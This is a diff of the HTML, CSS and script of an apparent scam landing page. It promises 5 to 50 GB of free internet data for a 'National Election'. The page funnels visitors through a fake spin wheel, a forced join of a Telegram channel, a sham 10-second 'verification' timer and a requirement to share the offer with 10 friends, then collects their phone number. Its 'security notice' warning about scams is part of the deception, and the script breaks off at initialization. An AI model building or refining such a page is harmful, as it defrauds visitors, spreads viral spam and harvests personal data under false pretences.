@@ -3,28 +3,52 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <!-- Meta tags for social sharing -->
-    <meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvxsEjNd1HPWGEj4XD1tQKZabnnD-biKXSdDnStYtEuE14WpZIA-Ax7TBv-Ns32A850qU0HlZNgISm-Lu0P_0wvO_Dk44pQPtS8C5m93eFrPfrK-Juzn29NSoWy3snVRkBtRntiQAUiVFynmYQd_-pMArXWla3yNZVMJoM01LAWxEy9i2qaLO5GJwUexTsA3gM/s600/Cover.png">
-    <meta property="og:url" content="[YOUR_WEBSITE_URL]"> <!-- Replace with your actual website URL -->
-    <title>*🎉 National Election! Win 5GB to 50GB Free Internet Data! Claim Yours Now!*</title>
-    <!-- Favicon - Consider updating if it's not relevant to elections -->
-    <link rel="icon" href="Eid al-adha wish.png">
-    
+    <title>National Election Special Offer: 5 to 50 GB Internet</title>
+    <!-- Favicon -->
+    <link rel="icon" href="favicon.ico"> <!-- User to provide favicon.ico -->
+
+    <!-- Open Graph Meta Tags -->
+    <meta property="og:title" content="National Election Special Offer: Get 5 to 50 GB Free Internet!">
+    <meta property="og:description" content="Claim your special election bonus! Spin to win 5-50 GB of free data. Limited time offer!">
+    <meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjNd1HPWGEj4XD1tQKZabnnD-biKXSdDnStYtEuE14WpZIA-Ax7TBv-Ns32A850qU0HlZNgISm-Lu0P_0wvO_Dk44pQPtS8C5m93eFrPfrK-Juzn29NSoWy3snVRkBtRntiQAUiVFynmYQd_-pMArXWla3yNZVMJoM01LAWxEy9i2qaLO5GJwUexTsA3gM/s600/Cover.png">
+    <meta property="og:url" content="YOUR_WEBSITE_URL_HERE"> <!-- Replace with your actual URL -->
+    <meta property="og:type" content="website">
+
     <style>
-        /* --- Dark Mode CSS Variables --- */
+        /* Base Styles */
         :root {
+            --primary-color: #007bff; /* Election blue */
+            --secondary-color: #6c757d; /* Gray */
+            --success-color: #28a745; /* Green for success */
+            --danger-color: #dc3545; /* Red for warnings/errors */
+            --warning-color: #ffc107; /* Yellow for emphasis */
             --background-color: #121212; /* Dark background */
-            --card-background: #1e1e1e; /* Slightly lighter card background */
+            --surface-color: #1e1e1e; /* Slightly lighter dark background for cards */
             --text-color: #e0e0e0; /* Light text */
-            --primary-color: #4CAF50; /* Green */
-            --secondary-color: #45a049; /* Darker green */
-            --accent-color: #FFD700; /* Gold/Yellow for highlights */
-            --border-color: #333;
+            --text-muted-color: #bdbdbd; /* Muted text */
+            --button-hover-color: #0056b3; /* Darker blue */
             --shadow-color: rgba(0, 0, 0, 0.5);
-            --modal-background: rgba(0, 0, 0, 0.8);
         }
 
-        /* --- General Styles --- */
+        body.dark-mode {
+            --background-color: #121212;
+            --surface-color: #1e1e1e;
+            --text-color: #e0e0e0;
+            --text-muted-color: #bdbdbd;
+            --primary-color: #007bff;
+            --button-hover-color: #0056b3;
+            --shadow-color: rgba(0, 0, 0, 0.5);
+        }
+        body.light-mode {
+            --background-color: #f8f9fa; /* Light background */
+            --surface-color: #ffffff; /* White cards */
+            --text-color: #212529; /* Dark text */
+            --text-muted-color: #6c757d; /* Muted dark text */
+            --primary-color: #007bff;
+            --button-hover-color: #0056b3;
+            --shadow-color: rgba(0, 0, 0, 0.1);
+        }
+
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             margin: 0;
@@ -33,42 +57,54 @@
             color: var(--text-color);
             text-align: center;
             overflow-x: hidden;
-            transition: background-color 0.3s ease;
+            transition: background-color 0.3s ease, color 0.3s ease;
         }
 
-        .page-section {
-            padding: 25px;
-            box-sizing: border-box;
-            max-width: 650px;
-            margin: 30px auto;
-            background-color: var(--card-background);
+        .page-container {
+            max-width: 700px;
+            margin: 20px auto;
+            padding: 20px;
+            background-color: var(--surface-color);
             border-radius: 12px;
-            box-shadow: 0 6px 12px var(--shadow-color);
-            transition: opacity 0.5s ease-in-out, max-height 0.5s ease-in-out, transform 0.5s ease-in-out;
-            overflow: hidden;
-            border: 1px solid var(--border-color);
-        }
-        .page-section.hidden {
+            box-shadow: 0 4px 15px var(--shadow-color);
             opacity: 0;
-            max-height: 0;
-            padding: 0 25px; /* Keep horizontal padding for transition */
-            margin-top: 0;
-            margin-bottom: 0;
-            border: none;
-            transform: scale(0.95);
-        }
-        .page-section.visible {
-            opacity: 1;
-            max-height: 2000px; /* Adjust as needed */
-            transform: scale(1);
+            transform: translateY(20px);
+            animation: fadeIn 0.8s ease-out forwards;
         }
 
-        /* --- Gateway Section --- */
-        #gateway-section {
-            display: block; /* Default to visible */
+        @keyframes fadeIn {
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
         }
-        #gateway-section.hidden {
-            display: none; /* Hide it when not in use */
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding-bottom: 20px;
+            border-bottom: 1px solid var(--text-muted-color);
+            margin-bottom: 20px;
+        }
+        .header h1 {
+            font-size: 24px;
+            margin: 0;
+            color: var(--primary-color);
+            font-weight: 600;
+            text-shadow: 0 0 8px var(--primary-color), 0 0 15px rgba(0, 123, 255, 0.5);
+        }
+        .theme-toggle {
+            background: none;
+            border: none;
+            color: var(--text-color);
+            font-size: 24px;
+            cursor: pointer;
+            padding: 5px 10px;
+            transition: transform 0.3s ease;
+        }
+        .theme-toggle:hover {
+            transform: scale(1.1);
         }
 
         #cover-image {
@@ -77,800 +113,661 @@
             height: auto;
             border-radius: 10px;
             margin-bottom: 25px;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.3);
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.4);
         }
 
         #main-heading {
-            font-size: 32px;
+            font-size: 28px;
             font-weight: bold;
-            margin-bottom: 25px;
-            color: var(--accent-color);
-            text-shadow: 0 0 8px rgba(255, 215, 0, 0.7);
-            animation: textGlow 4s infinite ease-in-out; /* More generic animation name */
+            margin-bottom: 20px;
+            color: var(--text-color);
             line-height: 1.3;
         }
-        @keyframes textGlow {
-            0%, 100% { text-shadow: 0 0 8px var(--accent-color), 0 0 12px #4CAF50; color: #e0e0e0; }
-            50% { text-shadow: 0 0 8px #FFA500, 0 0 12px #FF6347; color: #f0f0f0; }
-        }
         @media (max-width: 600px) {
-            #main-heading { font-size: 26px; }
+            #main-heading {
+                font-size: 22px;
+            }
         }
 
-        #click-here-button {
+        .click-here-container {
+            margin: 30px 0;
             cursor: pointer;
-            border: none;
-            background: none;
-            margin-bottom: 25px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            transition: transform 0.3s ease;
+            display: inline-block;
         }
-        #click-here-button:hover {
-            transform: scale(1.05);
-        }
-        #click-here-button img {
+        .click-here-container img {
             max-width: 280px;
             width: 80%;
             height: auto;
-            border-radius: 8px;
-            box-shadow: 0 5px 10px rgba(0,0,0,0.4);
+            transition: transform 0.3s ease;
+        }
+        .click-here-container:hover img {
+            transform: scale(1.05);
         }
 
-        /* --- Spin & Claim Section --- */
-        #spin-claim-section {
-            display: none; /* Hidden by default */
+        .content-section {
+            margin-top: 30px;
+            padding: 25px;
+            background-color: var(--surface-color);
+            border-radius: 10px;
+            box-shadow: 0 2px 8px var(--shadow-color);
+            text-align: left;
+            opacity: 0; /* Initially hidden for fade-in */
+            transform: translateY(20px); /* Slight downward offset */
+            animation: sectionFadeIn 0.6s ease-out forwards;
         }
-        #spin-claim-section.visible {
-            display: block;
+        @keyframes sectionFadeIn {
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .content-section.hidden {
+            display: none !important;
         }
 
-        .section-title {
-            font-size: 26px;
-            font-weight: bold;
+        .content-section h2, .content-section h3 {
+            color: var(--primary-color);
+            margin-top: 0;
+            text-align: center;
+            font-size: 22px;
             margin-bottom: 20px;
-            color: var(--accent-color);
-            text-shadow: 0 0 5px rgba(255, 215, 0, 0.6);
+            text-shadow: 0 0 5px rgba(0, 123, 255, 0.3);
         }
 
-        #spin-image-container {
+        #spin-wheel-container {
+            text-align: center;
             margin-bottom: 25px;
-            display: inline-block;
         }
         #spin-image {
             max-width: 350px;
-            width: 80%;
+            width: 90%;
             height: auto;
-            border-radius: 15px;
-            display: block;
-            margin: 0 auto;
-            box-shadow: 0 8px 15px rgba(0,0,0,0.4);
         }
         @keyframes spinAnimation {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(1080deg); } /* 3 full spins */
         }
         .spinning {
-            animation: spinAnimation 2.5s cubic-bezier(0.25, 0.1, 0.25, 1);
+            animation: spinAnimation 2s cubic-bezier(0.25, 0.1, 0.25, 1) forwards;
         }
 
-        .action-button, .share-button {
+        .action-button {
             background-color: var(--primary-color);
             color: white;
-            padding: 14px 30px;
+            padding: 12px 30px;
             border: none;
-            border-radius: 30px;
+            border-radius: 25px;
             cursor: pointer;
-            font-size: 18px;
-            font-weight: bold;
-            text-decoration: none;
+            font-size: 16px;
+            font-weight: 600;
             display: inline-block;
             margin: 10px 8px;
             transition: background-color 0.3s ease, transform 0.2s ease, box-shadow 0.2s ease;
-            box-shadow: 0 5px 0 #388E3C; /* 3D effect */
+            box-shadow: 0 4px 10px rgba(0, 123, 255, 0.3);
+            min-width: 180px;
         }
-        .action-button:hover, .share-button:hover {
-            background-color: var(--secondary-color);
+        .action-button:hover {
+            background-color: var(--button-hover-color);
             transform: translateY(-3px);
-            box-shadow: 0 8px 0 #388E3C;
+            box-shadow: 0 6px 15px rgba(0, 123, 255, 0.4);
         }
-        .action-button:active, .share-button:active {
+        .action-button:active {
             transform: translateY(1px);
-            box-shadow: 0 3px 0 #388E3C;
+            box-shadow: 0 2px 5px rgba(0, 123, 255, 0.2);
         }
-        .action-button:disabled, .share-button:disabled {
-            background-color: #555;
-            box-shadow: 0 5px 0 #333;
+        .action-button:disabled {
+            background-color: var(--text-muted-color);
+            box-shadow: none;
             cursor: not-allowed;
+            transform: none;
         }
-
-        #copy-link-button { background-color: #607D8B; box-shadow: 0 5px 0 #455A64; }
-        #copy-link-button:hover { background-color: #546E7A; box-shadow: 0 8px 0 #455A64;}
-
-        #whatsapp-share-button { background-color: #25D366; box-shadow: 0 5px 0 #1DAE54;}
-        #whatsapp-share-button:hover { background-color: #1DBA54; box-shadow: 0 8px 0 #1DAE54;}
-
-        #telegram-share-button { background-color: #0088cc; box-shadow: 0 5px 0 #006BA8;}
-        #telegram-share-button:hover { background-color: #0077b3; box-shadow: 0 8px 0 #006BA8;}
+        .share-button {
+            background-color: var(--secondary-color);
+            min-width: 170px;
+        }
+        .share-button:hover {
+             background-color: #5a6268;
+        }
+        #whatsapp-share-button { background-color: #25D366; }
+        #whatsapp-share-button:hover { background-color: #1DAE54; }
+        #telegram-share-button { background-color: #0088cc; }
+        #telegram-share-button:hover { background-color: #0077b3; }
+        #copy-link-button { background-color: #6c757d; }
+        #copy-link-button:hover { background-color: #5a6268; }
 
         .share-buttons-container {
-            margin-top: 25px;
             display: flex;
             flex-wrap: wrap;
             justify-content: center;
-            align-items: center;
+            margin-top: 20px;
+            gap: 10px;
         }
 
-        #gb-won-message {
-            font-size: 22px;
+        #telegram-join-section .warning {
+            color: var(--danger-color);
             font-weight: bold;
-            color: var(--primary-color);
-            margin: 20px 0;
-            padding: 15px;
-            background-color: #2a4c2a; /* Darker success background */
-            border: 1px solid #388E3C;
+            margin-bottom: 15px;
+            font-size: 1.1em;
+            border: 2px dashed var(--danger-color);
+            padding: 10px;
             border-radius: 8px;
-            transition: opacity 0.3s ease-in-out, transform 0.3s ease-in-out;
-            opacity: 0;
-            transform: translateY(15px);
-            box-shadow: 0 3px 6px rgba(0,0,0,0.3);
+            background-color: rgba(220, 53, 69, 0.1);
         }
-         #gb-won-message.visible {
-            opacity: 1;
-            transform: translateY(0);
+        #telegram-join-section .timer-text {
+            color: var(--warning-color);
+            font-weight: bold;
+            font-size: 1.1em;
+            margin-bottom: 10px;
+        }
+        #telegram-join-section #proceed-to-step2-button {
+            background-color: var(--success-color);
+            box-shadow: 0 4px 10px rgba(40, 167, 69, 0.3);
+        }
+        #telegram-join-section #proceed-to-step2-button:hover {
+            background-color: #218838;
+        }
+        #telegram-join-section #proceed-to-step2-button:disabled {
+            background-color: var(--text-muted-color);
+            box-shadow: none;
+            cursor: not-allowed;
         }
 
         #phone-input-section {
-            margin-top: 25px;
-            transition: opacity 0.4s ease-in-out, transform 0.4s ease-in-out;
-            opacity: 0;
-            transform: translateY(15px);
-        }
-        #phone-input-section.visible {
-            opacity: 1;
-            transform: translateY(0);
+            text-align: center;
         }
         #phone-number-input {
             padding: 12px 20px;
             border-radius: 25px;
-            border: 1px solid #444; /* Darker border */
+            border: 1px solid var(--text-muted-color);
             width: 75%;
-            max-width: 300px;
-            margin-bottom: 15px;
+            max-width: 350px;
+            margin: 15px auto;
             font-size: 16px;
             box-shadow: inset 0 2px 5px rgba(0,0,0,0.3);
-            background-color: var(--card-background);
+            background-color: var(--surface-color);
             color: var(--text-color);
         }
         #phone-number-input::placeholder {
-            color: #888;
-        }
-
-        /* --- Telegram Join Section --- */
-        #telegram-join-section {
-            margin-top: 25px;
-            border: 1px dashed var(--border-color);
-            border-radius: 10px;
-            padding: 20px;
-            background-color: #252525; /* Slightly different dark for emphasis */
-        }
-        #telegram-join-section h3 {
-            margin-top: 0;
-            color: var(--accent-color);
-            font-size: 20px;
-        }
-        .warning-alert {
-            color: #FF5722; /* Deep Orange for warning */
-            font-weight: bold;
-            margin: 15px 0;
-            font-size: 15px;
-            display: block;
-            border: 1px solid #FF5722;
-            padding: 10px;
-            border-radius: 5px;
-            background-color: rgba(255, 87, 34, 0.1);
-        }
-        #telegram-join-button {
-            display: block;
-            margin: 15px auto;
-            width: 80%;
-            max-width: 300px;
-            font-size: 17px;
-        }
-        #already-joined-button {
-            display: block;
-            margin: 10px auto;
-            background: none;
-            border: none;
-            color: #90CAF9; /* Light blue for info */
-            cursor: pointer;
-            font-size: 14px;
-            text-decoration: underline;
-        }
-        #timer-section {
-            margin-top: 15px;
-            font-size: 16px;
-            color: #f0f0f0;
-            display: none; /* Hidden by default */
-        }
-        #timer-section.visible {
-            display: block;
-        }
-
-        /* --- Dynamic Share Section --- */
-        #dynamic-share-section {
-            margin-top: 25px;
-            padding-top: 15px;
-            border-top: 1px solid var(--border-color);
-            transition: opacity 0.5s ease-in-out, max-height 0.5s ease-in-out;
-            opacity: 0;
-            max-height: 0;
-            overflow: hidden;
-        }
-         #dynamic-share-section.visible {
-            opacity: 1;
-            max-height: 600px; /* Adjust if content is taller */
+            color: var(--text-muted-color);
         }
 
         #progress-info-text {
-            font-size: 17px;
-            color: #F44336; /* Red */
-            font-weight: bold;
+            font-size: 15px;
+            color: var(--text-color);
             margin-bottom: 15px;
+            text-align: center;
         }
         .progress-bar-container {
-            width: 95%;
+            width: 90%;
             max-width: 450px;
-            background-color: #3a3a3a; /* Dark grey */
-            border-radius: 30px;
-            margin: 20px auto;
+            background-color: #3a3a3a;
+            border-radius: 25px;
+            margin: 15px auto;
             padding: 5px;
-            box-shadow: inset 0 2px 5px rgba(0,0,0,0.4);
+            box-shadow: inset 0 2px 5px rgba(0,0,0,0.5);
         }
         #progress-bar {
-            width: 0%;
             height: 30px;
             background-color: var(--primary-color);
-            border-radius: 25px;
+            border-radius: 20px;
             text-align: center;
             line-height: 30px;
             color: white;
             font-weight: bold;
-            font-size: 15px;
-            transition: width 0.6s ease-in-out;
-            box-shadow: inset 0 0 5px rgba(0,0,0,0.3);
-        }
-        #progress-bar.loading { /* For the animated stripes */
+            font-size: 14px;
+            transition: width 0.5s ease-in-out;
             background-image: linear-gradient(45deg, rgba(255, 255, 255, .15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, .15) 50%, rgba(255, 255, 255, .15) 75%, transparent 75%, transparent);
             background-size: 40px 40px;
-            animation: progress-bar-stripes 1.2s linear infinite;
+            animation: progress-bar-stripes 1s linear infinite;
         }
         @keyframes progress-bar-stripes {
             from { background-position: 40px 0; }
             to { background-position: 0 0; }
         }
 
-        /* --- Notification --- */
-        #copy-notification {
-            position: fixed;
-            bottom: 30px;
-            left: 50%;
-            transform: translateX(-50%);
-            background-color: #333;
-            color: white;
-            padding: 12px 25px;
-            border-radius: 8px;
-            z-index: 1000;
-            opacity: 0;
-            transition: opacity 0.5s ease-in-out;
-            font-size: 16px;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.5);
-            white-space: nowrap;
-        }
-        #copy-notification.show {
-            opacity: 1;
-        }
-
-        /* --- Congratulatory Modal --- */
         #congratulations-modal {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background-color: var(--modal-background);
+            background-color: rgba(18, 18, 18, 0.95);
             display: flex;
             justify-content: center;
             align-items: center;
-            z-index: 2000;
+            z-index: 10000;
             opacity: 0;
             visibility: hidden;
-            transition: opacity 0.5s ease, visibility 0.5s ease;
+            transition: opacity 0.5s ease-in-out, visibility 0.5s ease-in-out;
             backdrop-filter: blur(5px);
         }
         #congratulations-modal.show {
             opacity: 1;
             visibility: visible;
         }
-        #congratulations-modal-content {
-            background-color: var(--card-background);
-            padding: 40px;
+        .modal-content {
+            background-color: var(--surface-color);
+            padding: 30px 40px;
             border-radius: 15px;
-            box-shadow: 0 10px 20px rgba(0,0,0,0.6);
+            box-shadow: 0 8px 25px var(--shadow-color);
             text-align: center;
-            max-width: 500px;
-            width: 90%;
+            animation: zoomIn 0.5s ease-out;
         }
-        #congratulations-modal-content h2 {
-            color: var(--accent-color);
-            font-size: 30px;
-            margin-bottom: 15px;
-            text-shadow: 0 0 8px rgba(255, 215, 0, 0.7);
+        @keyframes zoomIn {
+            from { transform: scale(0.8); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
         }
-        #congratulations-modal-content p {
-            font-size: 18px;
-            margin-bottom: 30px;
+        .modal-content h2 {
+            color: var(--success-color);
+            margin-top: 0;
+            font-size: 28px;
+            text-shadow: 0 0 10px rgba(40, 167, 69, 0.5);
+        }
+        .modal-content img {
+            max-width: 150px;
+            height: auto;
+            margin: 20px 0;
+        }
+        .modal-content p {
+            font-size: 17px;
+            color: var(--text-muted-color);
             line-height: 1.5;
         }
-        #congratulations-modal-close {
+        .modal-content .close-button {
             background-color: var(--secondary-color);
-            color: white;
-            padding: 12px 25px;
-            border: none;
-            border-radius: 25px;
-            cursor: pointer;
-            font-size: 17px;
-            font-weight: bold;
-            transition: background-color 0.3s ease, transform 0.2s ease;
+            margin-top: 20px;
+            min-width: 150px;
         }
-        #congratulations-modal-close:hover {
-            background-color: var(--primary-color);
-            transform: translateY(-2px);
+        .modal-content .close-button:hover {
+            background-color: #5a6268;
         }
 
-        /* --- Responsive Adjustments --- */
-        @media (max-width: 768px) {
-            .page-section { padding: 20px; margin: 20px auto; }
-            #main-heading { font-size: 26px; }
-            .action-button, .share-button { padding: 12px 20px; font-size: 16px; }
-            #phone-number-input { width: 70%; }
-            #congratulations-modal-content { padding: 30px; }
-            #congratulations-modal-content h2 { font-size: 26px; }
-            #congratulations-modal-content p { font-size: 16px; }
+        #copy-notification {
+            position: fixed;
+            bottom: 25px;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: #333;
+            color: white;
+            padding: 12px 25px;
+            border-radius: 8px;
+            z-index: 1001;
+            opacity: 0;
+            transition: opacity 0.5s ease-in-out;
+            font-size: 15px;
+            white-space: nowrap;
         }
-        @media (max-width: 480px) {
-            #main-heading { font-size: 22px; margin-bottom: 20px;}
-            #cover-image { margin-bottom: 20px; }
-            .action-button, .share-button { margin: 8px 5px; padding: 10px 18px; font-size: 14px;}
-            #phone-number-input { width: 80%; }
-            .progress-bar-container { width: 90%; }
-            #spin-image { max-width: 280px; }
+        #copy-notification.show {
+            opacity: 1;
         }
     </style>
 </head>
-<body>
+<body class="dark-mode"> <!-- Default to dark mode -->
 
-    <!-- Audio for congratulatory effect -->
-    <audio id="congelation-sound" src="Congelation.mp3"></audio>
+    <!-- Audio element for Congelation -->
+    <audio id="congelation-sound" src="Congelation.mp3" preload="auto"></audio>
 
-    <!-- Congratulatory Modal -->
+    <!-- Congratulation Modal -->
     <div id="congratulations-modal">
-        <div id="congratulations-modal-content">
-            <h2>🎉 Congratulations! 🎉</h2>
-            <p id="modal-message">You have successfully completed the steps and will receive your prize soon!</p>
-            <button id="congratulations-modal-close">OK</button>
+        <div class="modal-content">
+            <h2>Congratulations!</h2>
+            <img src="https://cdn-icons-png.flaticon.com/512/7424/7424712.png" alt="Gift Icon"> <!-- Placeholder Gift Icon -->
+            <p>You have successfully entered our special election campaign!</p>
+            <button id="close-modal-button" class="action-button close-button">Continue</button>
         </div>
     </div>
 
-    <!-- Gateway Section: This is the initial landing page -->
-    <div id="gateway-section" class="page-section visible">
-        <!-- You can replace eid.gif with a relevant election-themed image or keep it -->
-        <img id="cover-image" src="eid.gif" alt="National Election Offer Cover">
-        <h1 id="main-heading">🎉 National Election Special Offer! Win 5GB to 50GB Free Internet Data! Claim Yours Now! 🎉</h1>
-        <div id="click-here-button">
-            <!-- You can replace Click Here.gif with a relevant button image -->
-            <img src="Click Here.gif" alt="Click Here to Claim Offer">
+    <div class="page-container">
+        <div class="header">
+            <h1>National Election Special Offer</h1>
+            <button id="theme-toggle-button" class="theme-toggle" aria-label="Toggle Dark Mode">
+                <span id="theme-icon">🌙</span> <!-- Moon icon for dark mode -->
+            </button>
         </div>
-        
-        <!-- Placeholder for Ads if you wish to add them -->
-        <div class="ad-container" style="min-height: 60px;">
-            <!-- Your ad code would go here -->
-        </div>
-    </div>
 
-    <!-- Spin & Claim Section: This appears in a new tab -->
-    <div id="spin-claim-section" class="page-section hidden">
-        <h2 class="section-title">Spin to Win up to 50GB Internet!</h2>
-        
-        <div id="spin-image-container">
-            <!-- Ensure Spin.png is relevant or replace it -->
-            <img id="spin-image" src="Spin.png" alt="Spin Wheel">
+        <!-- Main Offer Section -->
+        <div id="main-offer-section">
+            <img id="cover-image" src="Cover.png" alt="Election Offer Cover"> <!-- User to provide Cover.png or use a URL -->
+            <h1 id="main-heading">Celebrate the National Election with a FREE 5GB to 50GB Data Pack!</h1>
+            <div class="click-here-container">
+                <img src="Click Here.gif" alt="Click Here to Claim"> <!-- User to provide Click Here.gif -->
+            </div>
+            <p style="color: var(--text-muted-color); font-size: 0.9em;">Click the image above to start claiming your free data!</p>
         </div>
-        
-        <button id="spin-now-button" class="action-button">Spin Now</button>
-        
-        <!-- Message after winning GB -->
-        <div id="gb-won-message" class="hidden"></div>
 
-        <!-- Telegram Join Section -->
-        <div id="telegram-join-section" class="hidden">
-            <h3>Step 1: Join Telegram Channel</h3>
-            <p class="warning-alert">⚠️ IMPORTANT: Be aware of fake offers and scams. Only join the official channel linked below. Your prize will be verified by admins.</p>
-            <!-- Link to the target Telegram channel -->
-            <a href="https://t.me/FTearning72" target="_blank" id="telegram-join-button" class="action-button">Join Official Telegram Channel</a>
-            <button id="already-joined-button">I have Joined the Channel</button>
-            
-            <!-- Timer to simulate verification -->
-            <div id="timer-section">
-                <p>Please wait <strong id="countdown">10</strong> seconds while we verify your channel membership...</p>
+        <!-- Spin Offer Section -->
+        <div id="spin-offer-section" class="content-section hidden">
+            <h2>Spin the Wheel to Win Your Data!</h2>
+            <div id="spin-wheel-container">
+                <img id="spin-image" src="Spin.png" alt="Spin Wheel"> <!-- User to provide Spin.png -->
+            </div>
+            <button id="spin-now-button" class="action-button">Spin Now</button>
+            <div id="gb-won-message" class="hidden"></div>
+        </div>
+
+        <!-- Claim Steps Section -->
+        <div id="claim-steps-section" class="content-section hidden">
+            <div id="telegram-join-section">
+                <h2>Step 1: Join Our Telegram Channel</h2>
+                <p class="warning">
+                    <strong>IMPORTANT SECURITY NOTICE:</strong> This is a promotional offer related to the national election. To claim your data pack, you must join our official Telegram channel. Be wary of any third-party links or requests for payment. Clicking the button below will take you to Telegram.
+                </p>
+                <div class="timer-section" style="margin-bottom: 20px;">
+                    <p class="timer-text">Please wait for 10 seconds after joining to proceed.</p>
+                    <p id="countdown-timer" style="font-size: 1.5em; color: var(--warning-color); font-weight: bold;">10</p>
+                </div>
+                <a href="https://t.me/FTearning72" id="join-telegram-button" class="action-button" target="_blank" rel="noopener noreferrer">Join Telegram Channel</a>
+                <button id="proceed-to-step2-button" class="action-button hidden" disabled>Proceed to Step 2</button>
+            </div>
+
+            <hr style="border-color: var(--text-muted-color); opacity: 0.5; margin: 30px 0;">
+
+            <div id="sharing-section">
+                <h2>Step 2: Share to Unlock Your Reward</h2>
+                <p id="progress-info-text">Share this exciting offer with 10 friends across Telegram and Messenger to complete the verification and unlock your prize!</p>
+                <div class="progress-bar-container">
+                    <div id="progress-bar"></div>
+                </div>
+                <div class="share-buttons-container" id="final-share-buttons">
+                    <button id="copy-link-button" class="share-button">🔗 Copy Link</button>
+                    <button id="whatsapp-share-button" class="share-button">💬 Share on WhatsApp</button>
+                    <button id="telegram-share-button" class="share-button">✈️ Share on Telegram</button>
+                </div>
+                <button id="submit-phone-button" class="action-button hidden" disabled>Submit Phone Number</button>
             </div>
         </div>
 
-        <!-- Phone Input Section -->
-        <div id="phone-input-section" class="hidden">
-            <input type="tel" id="phone-number-input" placeholder="Enter your phone number">
+        <!-- Phone Input and Final Confirmation Section -->
+        <div id="phone-input-section" class="content-section hidden">
+            <h2>Final Step: Enter Your Phone Number</h2>
+            <p>Your 5-50 GB data pack will be credited after verification.</p>
+            <input type="tel" id="phone-number-input" placeholder="Enter your phone number (e.g., +8801xxxxxxxxx)">
             <button id="confirmation-button" class="action-button">Claim My Data</button>
         </div>
-        
-        <!-- Dynamic Share Section -->
-        <div id="dynamic-share-section" class="hidden">
-            <h3 style="margin-top: 25px; color: var(--accent-color);">Step 2: Share to Claim Your Prize!</h3>
-            <p id="progress-info-text">Share this offer with 10 friends on Telegram & Messenger to unlock your prize.</p>
-            
-            <div class="progress-bar-container">
-                <div id="progress-bar">0%</div>
-            </div>
-            
-            <div class="share-buttons-container" id="final-share-buttons">
-                <button id="copy-link-button" class="share-button">🔗 Copy Link</button>
-                <button id="whatsapp-share-button" class="share-button">💬 Share on WhatsApp</button>
-                <button id="telegram-share-button" class="share-button">✈️ Share on Telegram</button>
-            </div>
-        </div>
     </div>
 
-    <!-- Notification for copy link action -->
-    <div id="copy-notification">Link copied!</div>
+    <div id="copy-notification">Link copied to clipboard!</div>
 
     <script>
-        // --- DOM Elements ---
-        const gatewaySection = document.getElementById('gateway-section');
-        const spinClaimSection = document.getElementById('spin-claim-section');
-        
-        const clickHereButton = document.getElementById('click-here-button');
-        const spinNowButton = document.getElementById('spin-now-button');
-        const spinImage = document.getElementById('spin-image');
-        
-        const gbWonMessage = document.getElementById('gb-won-message');
-        
-        const telegramJoinSection = document.getElementById('telegram-join-section');
-        const alreadyJoinedButton = document.getElementById('already-joined-button');
-        const timerSection = document.getElementById('timer-section');
-        const countdownElement = document.getElementById('countdown');
-        
+        // DOM Elements
+        const mainOfferSection = document.getElementById('main-offer-section');
+        const spinOfferSection = document.getElementById('spin-offer-section');
+        const claimStepsSection = document.getElementById('claim-steps-section');
         const phoneInputSection = document.getElementById('phone-input-section');
-        const phoneNumberInput = document.getElementById('phone-number-input');
-        const confirmationButton = document.getElementById('confirmation-button');
 
-        const dynamicShareSection = document.getElementById('dynamic-share-section');
+        const clickHereContainer = document.querySelector('.click-here-container');
+        const spinImage = document.getElementById('spin-image');
+        const spinNowButton = document.getElementById('spin-now-button');
+        const gbWonMessage = document.getElementById('gb-won-message');
+
+        const joinTelegramButton = document.getElementById('join-telegram-button');
+        const countdownTimer = document.getElementById('countdown-timer');
+        const proceedToStep2Button = document.getElementById('proceed-to-step2-button');
+
         const progressBar = document.getElementById('progress-bar');
         const progressInfoText = document.getElementById('progress-info-text');
-        
         const copyLinkButton = document.getElementById('copy-link-button');
         const whatsappShareButton = document.getElementById('whatsapp-share-button');
         const telegramShareButton = document.getElementById('telegram-share-button');
+        const submitPhoneButton = document.getElementById('submit-phone-button');
+
+        const phoneNumberInput = document.getElementById('phone-number-input');
+        const confirmationButton = document.getElementById('confirmation-button');
+
         const copyNotification = document.getElementById('copy-notification');
-
-        const congratulationSound = document.getElementById('congelation-sound');
         const congratulationsModal = document.getElementById('congratulations-modal');
-        const modalMessage = document.getElementById('modal-message');
-        const congratulationsModalClose = document.getElementById('congratulations-modal-close');
+        const closeModalButton = document.getElementById('close-modal-button');
+        const congruSound = document.getElementById('congelation-sound');
+        const themeToggleButton = document.getElementById('theme-toggle-button');
+        const themeIcon = document.getElementById('theme-icon');
+        const body = document.body;
 
-        // --- State Variables ---
         let wonGB = 0;
         let shareCount = 0;
-        const maxShares = 10; // Target number of shares
-        let shareProgress = 0;
-        // 0: Initial (after spinning), 1: Telegram joined, waiting for timer, 2: Timer finished, ready to share
-        let shareStage = 0; 
-        
-        // Share text and URLs - Ensure these are correct and encoded properly
-        const shareTextGlobal = "*🎉 National Election Special Offer! Win 5GB to 50GB Free Internet Data! Claim Yours Now!*";
-        const telegramChannelUrl = "https://t.me/FTearning72"; // Target Telegram channel for joining
+        let currentShareProgress = 0;
+        const requiredShares = 10;
+        const shareAmountIncrease = 100 / requiredShares;
 
-        // --- Initialization ---
-        document.addEventListener('DOMContentLoaded', () => {
-            // Check if this tab was opened via the 'promo=election' query or '#spin' hash
-            const isSpinTab = window.location.hash === '#spin' || window.location.search.includes('promo=election');
-            
-            if (isSpinTab) {
-                // If it's the spin tab, hide the gateway and show the spin/claim section
-                gatewaySection.style.display = 'none';
-                spinClaimSection.style.display = 'block';
-                
-                // Trigger congratulatory effect and sound on page load for the spin tab
-                playCongratulation();
-                
-                // Set the initial UI state based on the current stage
